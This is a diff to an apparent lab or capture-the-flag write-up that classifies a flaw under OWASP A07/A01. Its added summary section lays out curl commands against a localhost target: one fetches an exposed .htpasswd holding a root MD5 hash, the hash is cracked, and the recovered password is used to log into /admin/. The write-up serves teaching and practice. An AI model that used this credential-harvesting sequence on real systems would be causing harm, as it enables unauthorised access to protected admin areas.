@@ -5,7 +5,22 @@
 **OWASP A07:2021 - Identification and Authentication Failures** (CWE-521: Weak Password Requirements)
 **OWASP A01:2021 - Broken Access Control** (CWE-276: Incorrect Default Permissions)
 
-Found `/whatever/` directory (listed in robots.txt). Inside was an exposed `.htpasswd` file containing:
+## Summary
+
+page: `http://localhost:8080/whatever/` → then `http://localhost:8080/admin/`
+commands:
+```bash
+# 1. Find exposed .htpasswd
+curl http://localhost:8080/whatever/htpasswd
+# → root:437394baff5aa33daa618be47b75cb49
+
+# 2. Crack MD5 on crackstation.net → qwerty123@
+
+# 3. Login to /admin/ with basic auth
+curl -u "root:qwerty123@" http://localhost:8080/admin/
+```
+
+## Found `/whatever/` directory (listed in robots.txt). Inside was an exposed `.htpasswd` file containing:
 ```
 root:437394baff5aa33daa618be47b75cb49
 ```
